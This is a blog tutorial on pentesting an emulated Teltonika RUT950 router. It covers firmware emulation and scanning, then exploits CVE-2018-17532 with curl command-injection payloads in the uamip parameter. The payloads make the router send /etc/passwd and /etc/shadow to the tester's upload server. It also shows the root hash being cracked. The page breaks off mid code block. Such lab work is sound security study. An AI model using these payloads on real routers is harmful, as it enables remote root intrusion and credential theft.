<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="IoT Pentesting with Teltonika RUT9XX" /><meta name="author" content="BaadMaro" /><meta property="og:locale" content="en" /><meta name="description" content="Today we are going to practice some IoT pentesting with a device called RUT950 as an example." /><meta property="og:description" content="Today we are going to practice some IoT pentesting with a device called RUT950 as an example." /><link rel="canonical" href="https://baadmaro.github.io/posts/IoT-Pentesting-with-Teltonika-RUT9XX/" /><meta property="og:url" content="https://baadmaro.github.io/posts/IoT-Pentesting-with-Teltonika-RUT9XX/" /><meta property="og:site_name" content="BaadMaro" /><meta property="og:image" content="https://baadmaro.github.io/assets/img/posts/RUT950.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-25T00:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://baadmaro.github.io/assets/img/posts/RUT950.png" /><meta property="twitter:title" content="IoT Pentesting with Teltonika RUT9XX" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BaadMaro" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BaadMaro"},"dateModified":"2023-03-16T16:03:00+00:00","datePublished":"2022-07-25T00:00:00+00:00","description":"Today we are going to practice some IoT pentesting with a device called RUT950 as an example.","headline":"IoT Pentesting with Teltonika RUT9XX","image":"https://baadmaro.github.io/assets/img/posts/RUT950.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://baadmaro.github.io/posts/IoT-Pentesting-with-Teltonika-RUT9XX/"},"url":"https://baadmaro.github.io/posts/IoT-Pentesting-with-Teltonika-RUT9XX/"}</script><title>IoT Pentesting with Teltonika RUT9XX | BaadMaro</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BaadMaro"><meta name="application-name" content="BaadMaro"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BaadMaro</a></div><div class="site-subtitle font-italic">My journey into hacking</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BaadMaro" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>IoT Pentesting with Teltonika RUT9XX</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>IoT Pentesting with Teltonika RUT9XX</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1658707200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 25, 2022 </em> </span> <span> Updated <em class="" data-ts="1678982580" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 16, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> BaadMaro </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2882 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"> <img data-src="/assets/img/posts/RUT950.png" class="post-preview-img" data-proofer-ignore><p>Today we are going to practice some IoT pentesting with a device called RUT950 as an example.</p><p>I’ll explain different techniques used in IoT pentesting including emulation, firmware analysis, exploitation and pivoting.</p><p>This article was made for a hack event organised by The hacking News B’Darija.</p><h1 id="disclaimer">Disclaimer</h1><p>All information and software available on this page are for educational purposes only.</p><h1 id="our-target">Our target</h1><p><img data-src="https://user-images.githubusercontent.com/72421091/180686586-70d775f0-d283-4e65-b009-c76ba31ac823.png" alt="Pasted image 20220724201003" data-proofer-ignore></p><p>RUT950 is a high-performance industrial 4G LTE Wi-Fi router designed as a Main/Backup internet source and guarantees a reliable internet connection with high data throughput and data redundancy.</p><p>You can see all features here : https://teltonika-networks.com/product/rut950/</p><p>I don’t have the device, so emulation is our go.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180686759-34d707b9-916e-400f-bec3-8f35d1f2a97d.png" alt="Pasted image 20220725033832" data-proofer-ignore></p><h1 id="emulation">Emulation</h1><p>A lot of IoT devices like routers and embedded systems runs on a <a href="https://en.wikipedia.org/wiki/Reduced_instruction_set_computer">RISC</a> CPUs with MIPS architucture.</p><p>The RUT950 has A MIPS CPU “Atheros, MIPS 74Kc, 550 MHz”. You can get more details from the datasheet https://teltonika-networks.com/downloads/en/rut950/RUT950_Datasheet-v1.0.pdf</p><p>To be able to emulate the router, we need a emulator/virtualizer to be able to transform MIPS instructions intended for the real hardware to our x64 system.</p><p>There’s a project called Qemu. It’s a generic and open source machine emulator and virtualizer. You can read the documentation for more details here : https://qemu-project.gitlab.io/qemu/about/index.html</p><p>Here is an example of a binary emulation from our target https://www.youtube.com/watch?v=xXfjmVJ_iho</p><p>As we target a router system, there is project called Firmware Analysis Toolkit used to emulate firmware and analyse it for security vulnerabilities using Qemu https://github.com/attify/firmware-analysis-toolkit</p><h1 id="firmware-analysis-toolkit---installation">Firmware Analysis Toolkit : Installation</h1><p>The tool requires multiple dependencies. You can use the author’s OS for better experience https://github.com/adi0x90/attifyos</p><p>For me i will setup the tool in a Kali linux 2022.2 in vmware.</p><p>Start by cloning the project from github and running the setup.sh</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>git clone https://github.com/attify/firmware-analysis-toolkit
<span class="nb">cd </span>firmware-analysis-toolkit
./setup.sh
</pre></table></code></div></div><p>Some errors during installalation</p><ul><li>Before running setup.sh, if you use kali linux just remove lsb-core from the line 5.<li>While installing binwalk there is a problem with the qt5base-dev. In line 64 in binwalk/deps.sh change “qt5base-dev” to “qtbase5-dev” https://github.com/ReFirmLabs/binwalk/blob/master/deps.sh#L46<li>Another problem with sasquatch compilation https://github.com/devttys0/sasquatch/issues/48. in binwalk/deps.sh change “https://github.com/devttys0/sasquatch” to “https://github.com/threadexio/sasquatch” It’s fork that has the fix https://github.com/ReFirmLabs/binwalk/blob/master/deps.sh#L86<li>Now return the setup.sh file , comment git clone binwalk https://github.com/attify/firmware-analysis-toolkit#L8 and rerun setup.sh.</ul><p>After installation, we need to add sudo password to the config file “fat.config”.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[DEFAULT]
sudo_password=kali
firmadyne_path=/home/attify/firmadyne
</pre></table></code></div></div><h1 id="emulation-using-firmware">Emulation using firmware</h1><p>For the emulation, we going to use the router firmware. You can find it at https://wiki.teltonika-networks.com/view/RUT950<em>Firmware_Downloads</em>(legacy_WebUI)</p><p>There’s a technique to dump the firmware from the UART interface and also get a shell.</p><p>UART is used for asynchronous serial communications to send and receive data from devices for purposes such as updating firmware manually, debugging tests, or interfacing with the underlying system</p><p>For our target, UART is not supported (maybe) https://teltonika-networks.com/compare/?networking=rut950,rut955. We can find a close version with serial enabled https://fccid.io/2AET4RUT955AF/Internal-Photos/Internal-Photos-4897313</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180852662-c4da7aae-1f40-4ea1-9440-6e5214ae2fa4.png" alt="image" data-proofer-ignore></p><p>here is an example for RUTX09 https://community.teltonika-networks.com/18898/notice-there-internal-serial-port-device-rutx09-how-do-use-it</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180687000-c3a1076c-bfbc-4583-bb8c-5b611dfe13e6.png" alt="Pasted image 20220724212511" data-proofer-ignore> <img data-src="https://user-images.githubusercontent.com/72421091/180687055-503c0abe-9f96-44c7-aca5-3c9f10e3d6c9.png" alt="Pasted image 20220724212526" data-proofer-ignore></p><p>To be able to communicate with the UART interface, we need a USB to serial converter.</p><p>You can find more details here about the whole thing : https://www.youtube.com/watch?v=YD6ODeER8qM</p><div class="table-wrapper"><table><tbody><tr><td>For the firmware, i’ll use an old version # <strong><a href="https://wiki.teltonika-networks.com/wikibase/images/c/c4/RUT9XX_R_00.04.172_WEBUI.bin" title="RUT9XX R 00.04.172 WEBUI.bin">RUT9XX_R_00.04.172</a></strong> <td>2018.04.10</table></div><h1 id="running-fatpy-with-our-firmware">Running fat.py with our firmware</h1><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./fat.py RUT9XX_R_00.04.172_WEBUI.bin
</pre></table></code></div></div><p>In the first try, i had a an empty network interfaces so i increased the timeout to 360 in scripts/inferNetwork.sh</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"Running firmware </span><span class="k">${</span><span class="nv">IID</span><span class="k">}</span><span class="s2">: terminating after 360 secs..."</span>
<span class="nb">timeout</span> <span class="nt">--preserve-status</span> <span class="nt">--signal</span> SIGINT 360 <span class="s2">"</span><span class="k">${</span><span class="nv">SCRIPT_DIR</span><span class="k">}</span><span class="s2">/run.</span><span class="k">${</span><span class="nv">ARCH</span><span class="k">}</span><span class="s2">.sh"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">IID</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><p>Now let’s run it again</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180687534-3b12e726-1e24-4ec0-ba09-6a7445e5a76b.png" alt="Pasted image 20220724215828" data-proofer-ignore></p><p>We can see our machine ip address let’s click enter now</p><p>We can use enter again after init finshed to access shell</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180687639-bfc39b1d-c3ea-4871-bc96-fc80c9f483df.png" alt="Pasted image 20220725034753" data-proofer-ignore></p><p>After a while check the router webpage at http//:192.168.1.1</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180687752-9ede4b92-e0aa-47ab-9df4-24aa4dd97cc3.png" alt="Pasted image 20220724220246" data-proofer-ignore></p><p>Let’s run an nmap scan to see if other services are up too</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 192.168.1.1
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-07-24 17:03 EDT
Nmap scan report <span class="k">for </span>192.168.1.1
Host is up <span class="o">(</span>0.0089s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      Dropbear sshd 2018.76 <span class="o">(</span>protocol 2.0<span class="o">)</span>
53/tcp  open  domain   dnsmasq 2.78
| dns-nsid: 
|_  bind.version: dnsmasq-2.78
80/tcp  open  http     LuCI Lua http config
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
443/tcp open  ssl/http LuCI Lua http config
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Teltonika/stateOrProvinceName<span class="o">=</span>Vilnius/countryName<span class="o">=</span>LT
| Not valid before: 2018-04-10T12:23:14
|_Not valid after:  2020-04-09T12:23:14
|_ssl-date: 2018-04-10T12:27:39+00:00<span class="p">;</span> <span class="nt">-4y105d08h36m43s</span> from scanner time.
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</pre></table></code></div></div><p>As we can see we have ssh, dns, http and https up. Now let’s do some hacking stuff.</p><h1 id="vulnerabilities">Vulnerabilities</h1><p>There are many ways to find vulnerabilities in our system :</p><ul><li><p>Firmware : the best way to start is by exploring the firmware. We can find a lot of things like services source code, hardcoded creds and more. I’ll do a quick overview later in the article</p><li><p>Services : as we can see in our previous nmap scan, we were able to identify services versions like dropbear ssh 2018.76 for ssh, dnsmasq 2.78 for dns and LuCI lua http for the web service. We can search for vulnerabilities in these services.</p><li><p>Routersploit : is an open-source exploitation framework dedicated to embedded devices. It’s has a lot of exploits, creds, scanners, payloads and generic attacks modules for embedded devices https://github.com/threat9/routersploit</p><li><p>Releases changelog : in many scenarios we can see that a device is not running the latest version, so we can track fixes for newers version. For example in our case i choosed the version “RUT9XX_R_00.04.172<em>WEBUI.bin” if we go above a little bit we can see that in the version “RUT9XX_R_00.04.233” a CVE was fixed https://wiki.teltonika-networks.com/view/RUT950_Firmware_Downloads</em>(legacy_WebUI)</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>-   Fixes:
    -   Minor Hotspot fixes (CVE-2018-17532)
    -   Minor SIM Switch fixes
    -   Minor opkg fix and package update
</pre></table></code></div></div><ul><li>Searching for CVEs : https://www.opencve.io/cve?vendor=teltonika&amp;product=rut950_firmware</ul><p><img data-src="https://user-images.githubusercontent.com/72421091/180689081-761aee44-817e-4404-b914-0943b0140ebe.png" alt="Pasted image 20220724222320" data-proofer-ignore></p><ul><li><p>POCs : we can search on github also for same research about the device. Sometimes you can find some research and tools that can help with the pentesting documentation.</p><li><p>Finiding your own exploit / Bug bounty : You can go for the ultimate win by analysing the device and try find exploits. As an example we can use burp and start exploring the web interface to garther more information and start analyzing / fuzzing. The firmware can help also in this case, we can look at web files and reverse used binaires also. Here is an example of an exploit found by analyzing a binary in a TP link router : https://www.youtube.com/watch?v=zjafMP7EgEA</p></ul><h1 id="cve-2018-17532--teltonika-rut9xx-unauthenticated-os-command-injection">CVE-2018-17532 : Teltonika RUT9XX Unauthenticated OS Command Injection</h1><p>Teltonika RUT9XX routers with firmware before 00.04.233 are prone to multiple unauthenticated OS command injection vulnerabilities in autologin.cgi and hotspotlogin.cgi due to insufficient user input sanitization. This allows remote attackers to execute arbitrary commands with root privileges.</p><p>We can see more details here : https://www.opencve.io/cve/CVE-2018-17532</p><p>Full explanation here : https://github.com/sbaresearch/advisories/tree/public/2018/SBA-ADV-20180319-01_Teltonika_OS_Command_Injection</p><p>With the “hotspotlogin.cgi” file, he found that there is no proper sanitization for user input in the uamip parameter that is loaded in an os.execute :skull: </p><h2 id="poc"><span class="mr-2">POC</span><a href="#poc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>An attacker can exploit this vulnerability by manipulating the <code class="language-plaintext highlighter-rouge">uamip</code> parameter:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-v</span> <span class="nt">-o</span> /dev/null <span class="s2">"http://</span><span class="nv">$IP</span><span class="s2">/cgi-bin/hotspotlogin.cgi"</span> <span class="nt">-d</span> <span class="s1">'send=1&amp;uamip="; id &gt;/tmp/test #'</span>
</pre></table></code></div></div><p>The device executes the commands with root privileges:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cat</span> /tmp/test
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></table></code></div></div><p>Let’s use the exploit with our emulated device</p><p>The exploit is blind, so we need something to see the output without accessing the router shell.</p><p>I’ll use a webserver https://pypi.org/project/uploadserver/</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...

</pre></table></code></div></div><p>Sending the exploit</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-v</span> <span class="nt">-o</span> /dev/null <span class="s2">"http://192.168.1.1/cgi-bin/hotspotlogin.cgi"</span> <span class="nt">-d</span> <span class="s1">'send=1&amp;uamip="; curl -X POST http://192.168.1.110:8000/upload -F "files=@/etc/passwd" #'</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">*</span>   Trying 192.168.1.1:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--     0<span class="k">*</span> Connected to 192.168.1.1 <span class="o">(</span>192.168.1.1<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> POST /cgi-bin/hotspotlogin.cgi HTTP/1.1
<span class="o">&gt;</span> Host: 192.168.1.1
<span class="o">&gt;</span> User-Agent: curl/7.82.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Content-Length: 87
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span> 
<span class="o">}</span> <span class="o">[</span>87 bytes data]
100    87    0     0  100    87      0     27  0:00:03  0:00:03 <span class="nt">--</span>:--:--    27<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Connection: close
&lt; Transfer-Encoding: chunked
100    87    0     0  100    87      0     23  0:00:03  0:00:03 <span class="nt">--</span>:--:--    23&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
&lt; 
<span class="o">{</span> <span class="o">[</span>5 bytes data]
100  2760    0  2673  100    87    736     23  0:00:03  0:00:03 <span class="nt">--</span>:--:--   759
<span class="k">*</span> Closing connection 0
                                                                                                 
</pre></table></code></div></div><p>Let’s see our server</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
192.168.1.1 - - <span class="o">[</span>24/Jul/2022 17:45:48] Upload of <span class="s2">"passwd"</span> accepted
192.168.1.1 - - <span class="o">[</span>24/Jul/2022 17:45:48] <span class="s2">"POST /upload HTTP/1.1"</span> 204 -
192.168.1.1 - - <span class="o">[</span>24/Jul/2022 17:45:50] Upload of <span class="s2">"passwd"</span> accepted
192.168.1.1 - - <span class="o">[</span>24/Jul/2022 17:45:50] <span class="s2">"POST /upload HTTP/1.1"</span> 204 -

</pre></table></code></div></div><p>We were able to get the passwd file, let’s check it</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/ash
daemon:<span class="k">*</span>:1:1:daemon:/var:/bin/false
ftp:<span class="k">*</span>:55:55:ftp:/home/ftp:/bin/false
network:<span class="k">*</span>:101:101:network:/var:/bin/false
nobody:<span class="k">*</span>:65534:65534:nobody:/var:/bin/false

</pre></table></code></div></div><p>As we can see the os command injection worked and we were able to get the passwd file using curl</p><p>Now let’s try with a reverse shell. I tried multiple reverse shells with bash ,ash and sh but without success. We need to find another solution.</p><h2 id="shadow-file"><span class="mr-2">Shadow file</span><a href="#shadow-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As the exploit run commandes using root privileges, let’s read the /etc/shadow file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-v</span> <span class="nt">-o</span> /dev/null <span class="s2">"http://192.168.1.1/cgi-bin/hotspotlogin.cgi"</span> <span class="nt">-d</span> <span class="s1">'send=1&amp;uamip="; curl -X POST http://192.168.1.110:8000/upload -F "files=@/etc/shadow" #'</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>root:$1$o1tYRea4$blIAJ7l1GqkT8NTwcC41n1:15225:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::

</pre></table></code></div></div><p>We got the root hash. It’s a md5crypt hash. Let’s crack it using hashcat or john.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>john hash.txt
Created directory: /home/kali/.john
Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 128/128 AVX 4x3]<span class="o">)</span>
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
admin01          <span class="o">(</span>?<span class="o">)</span>     
1g 0:00:00:47 DONE 3/3 <span class="o">(</span>2022-07-24 18:09<span class="o">)</span> 0.02124g/s 105252p/s 105252c/s 105252C/s adoutt1..admarri
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 

</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
